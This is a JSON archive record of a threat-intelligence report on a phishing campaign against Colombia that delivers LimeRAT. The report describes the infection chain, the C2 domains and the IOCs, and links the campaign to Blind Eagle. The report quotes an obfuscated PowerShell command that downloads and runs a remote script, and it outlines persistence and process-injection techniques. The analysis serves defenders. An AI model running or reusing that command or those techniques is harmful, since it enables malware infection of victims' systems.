{
    "id": "64e777c2-0224-4d21-9672-008d6fb4c744",
    "created_at": "2023-01-12T15:08:18.191826Z",
    "updated_at": "2025-03-27T02:16:09.278814Z",
    "deleted_at": null,
    "sha1_hash": "1cbe5eddd24a7031daeca0c00e689b17843080c8",
    "title": "2021-05-17 - Literature lover targeting Colombia with LimeRAT",
    "authors": "",
    "file_creation_date": "2022-05-28T23:35:18Z",
    "file_modification_date": "2022-05-28T23:35:18Z",
    "file_size": 690353,
    "plain_text": "# Literature lover targeting Colombia with LimeRAT\n\n**lab52.io/blog/literature-lover-targeting-colombia-with-limerat/**\n\nIn the middle of the current brouhaha in Colombia, besides the intense hacktivism activity, some actors\nmight be trying to take their move. Several campaigns aimed to Colombia have been detected, but today we\nwill talk about one with a couple interesting details in their kill chain.\n\nThis actor is starting the infection via email with very generic topics such as subpoenas or bank payments,\nwith a crafted html view where the icon pretending to be an attachment is in fact an image with a link to\ndownload a compressed file from One Drive.\n\nPhishing emails serving same malicious sample\nThe .rar file contains a Visual Basic Script with same name “citacion juzgado.vbs” which, poorly obfuscated,\nwill create a Windows Script Host Shell Object to download and execute a new Powershell script by\nexecuting the following command:\n\n“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” I`E`X((n`e`W`Obj`E`c`T((‘Net.Webclient’))).\n((‘Downloadstri’+’ng’)).InVokE(((‘https://ia601509.us.archive.org/20/items/3_20210512_20210512_1430/3.txt’))))\n\nThe interesting fact about this first stage is that this element is being downloaded from The Internet Archive,\nwhere you can take snapshots of websites, or upload “antique” files, so they keep being accessible after the\nwebsite disappears from the ordinary internet at their original hosting site. We are starting to witness how\nattackers are using legitimate domains such as discord or twitter, to download some malicious payload, or\neven legitimate cloud services such as One Drive or DropBox to host different samples. However, using The\nInternet Archive could be considered witty, and not-so-much seen in the wild so far.\n\n\n-----\n\n_Opendir in The Internet Archive_\nBasically, this Powershell script will download a series of other different scripts which will be dropped in\n“C:\\Users\\Public\\” and “C:\\ProgramData\\Microsoft Arts\\Start\\”, and establish persistence using the Registry\nKey “HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders”.\n\nInfection Chain\nAmong these different scripts, most of them trying to disable typical AntiVirus solutions, there is one\nimplementing a technique a little more advanced than the rest of the techniques, known as Reflection\nAssembly, and consisting of the creation of binary payloads as byte arrays in Powershell and then loading\nthem using a puppet process injection within the memory of process\n“C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe” as shown in the following screenshot, or in\n“C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe”, depending on the results of some\nprevious checks.\n\nReflected Assembly Process injection\n\n\n-----\n\nAfter dumping this binary content into respective files, we could identify two Dynamic Libraries written in\n.NET, one of them used as a loader for the other, which happens to be the final malicious Remote Access\nTrojan (RAT). According to [360 Total Security researchers, some similar techniques were spotted loading a](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/)\nDelphi version of the njRAT in July 2020, by what it seemed to be an Arabic speaker actor. Even though in\nboth cases the binary files have resulted in Dynamic Libraries and same loading technique, in this occasion\nboth binaries were identified as written in .NET. Furthermore, the RAT used in this scenario was Lime-RAT, a\nmodified version of njRAT.\n\nWhen taking a closer look at the final stage in order to identify the final Command and Control server, we\nfound another interesting element. This actor chose the domain “santiagonasar.]duckdns.org”, which is\nactually the name of the main character of Chronicle of a Death Foretold (Crónica de una muerte\nanunciada), a great novel written by Gabriel García Márquez, Colombian writer. But the passion for literature\nof our friends was not only reflected in the domain name, but also in the chosen port: 1984. Although the\naforementioned book was published in 1983, our first impression was to think of this name as a reference to\nthe novel written by George Orwell, named “1984”.\n\nDespite having seen the string “ALOSH” repetitively through the different stages, suggesting that this could\nbe an individual going by this nickname, it is worth mentioning the fact that the APT group referred as APTC-36, or Blind Eagle, have been spotted many times using this same toolset including LimeRAT, targeting\nsame geographic area through phishing emails written in perfect Spanish, and also using Duckdns as part of\ntheir infrastructure.\n\nAfter a quick research on previous DNS resolutions of the final C2, we could identify related documents\ncontacting the same IP, referring to Colombia and the use of the word “Cacha”, which could be a way of\nsaying “friend” or “brother” in Colombia, among other meanings in Spanish. These relations, added to the\nSpanish literary culture, would clearly indicate a focus in Colombia.\n\nPrevious domains resolving to same IP\n\nDifferent execution parents\nLastly, after another quick search on different binary executables contacting this same C2, we found different\nforms of packed malware samples using strings in Asian and Cyrillic encoding, with a noisier obfuscation.\nAbout these samples, we noticed that the attacker could have been only rotating the contacted port (4433,\n1986, 2000) which could be enough to mislead an automated sandbox identifying the host as dead. The\n\n\n-----\n\ncached analysis in shodan.io would also show that the server might only have one port open at a time, which\nwould support the idea of the attacker rotating ports for every campaign while reusing same C2\ninfrastructure.\n\nC2 check in shodan.io\nIOCs\n\n0d7abdd154b96c36680719ef15d81c64a0a12276a5d1ec8d9ec0bffd45545d6\n\nff525bc3aade928db718dab395eeba0f886054c889dda2389a51628d58924ff5\n\n0a9a1e043d8138bb8fb257f07ac80c0fb8287eec1c131efff3a4302b13ec78c3\n\nhttps://onedrive.live.]com/download?\ncid=A4F059D1DE692167&resid=A4F059D1DE692167%21107&authkey=AOG1a9Z-hUIFbhI\n\nhttps://nyc008.hawkhost.]com/~invoixec/\n\nhttps://ia601509.us.archive.]org/20/items/3_20210512_20210512_1430/3.txt\n\nhttps://ia601509.us.archive.]org/28/items/1_20210512_20210512_1427/1.txt\n\nsantiagonasar.]duckdns.org\n\nsantiagonasar2.]duckdns.org\n\ncachanuevo.]duckdns.org\n\n2021cacha.]duckdns.org\n\nenviocacha.]duckdns.org\n\nsosht.]duckdns.org\n\n172.96.187.2\n\n181.141.0.30\n\nReferences\n\n[https://twitter.com/1ZRR4H/status/1392789216141004802](https://twitter.com/1ZRR4H/status/1392789216141004802)\n\n[https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-17 - Literature lover targeting Colombia with LimeRAT.pdf"
    ],
    "report_names": [
        "2021-05-17 - Literature lover targeting Colombia with LimeRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "98b22fd7-bf1b-41a6-b51c-0e33a0ffd813",
            "created_at": "2022-10-25T15:50:23.688973Z",
            "updated_at": "2025-03-27T02:00:55.524322Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "APT-C-36",
                "Blind Eagle"
            ],
            "source_name": "MITRE:APT-C-36",
            "tools": [
                "Imminent Monitor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bd43391b-b835-4cb3-839a-d830aa1a3410",
            "created_at": "2023-01-06T13:46:38.925525Z",
            "updated_at": "2025-03-27T02:00:02.95302Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "Blind Eagle"
            ],
            "source_name": "MISPGALAXY:APT-C-36",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "be597b07-0cde-47bc-80c3-790a8df34af4",
            "created_at": "2022-10-25T16:07:23.407484Z",
            "updated_at": "2025-03-27T02:02:09.784411Z",
            "deleted_at": null,
            "main_name": "Blind Eagle",
            "aliases": [
                "APT-C-36",
                "APT-Q-98",
                "AguilaCiega"
            ],
            "source_name": "ETDA:Blind Eagle",
            "tools": [
                "AsyncRAT",
                "BitRAT",
                "Bladabindi",
                "BlotchyQuasar",
                "Imminent Monitor",
                "Imminent Monitor RAT",
                "Jorik",
                "LimeRAT",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Socmer",
                "Warzone",
                "Warzone RAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536098,
    "ts_updated_at": 1743041769,
    "ts_creation_date": 1653780918,
    "ts_modification_date": 1653780918,
    "files": {
        "pdf": "https://archive.orkl.eu/1cbe5eddd24a7031daeca0c00e689b17843080c8.pdf",
        "text": "https://archive.orkl.eu/1cbe5eddd24a7031daeca0c00e689b17843080c8.txt",
        "img": "https://archive.orkl.eu/1cbe5eddd24a7031daeca0c00e689b17843080c8.jpg"
    }
}